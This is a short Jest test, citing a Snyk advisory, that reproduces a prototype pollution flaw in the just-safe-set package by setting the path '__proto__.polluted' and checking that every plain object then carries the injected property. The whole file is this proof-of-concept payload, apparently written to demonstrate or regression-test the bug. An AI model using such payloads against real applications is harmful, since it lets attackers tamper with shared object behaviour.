//https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267
test("prototype pollution in just-safe-set", () => {
  const justSafeSet = require("just-safe-set");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  justSafeSet(obj, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});
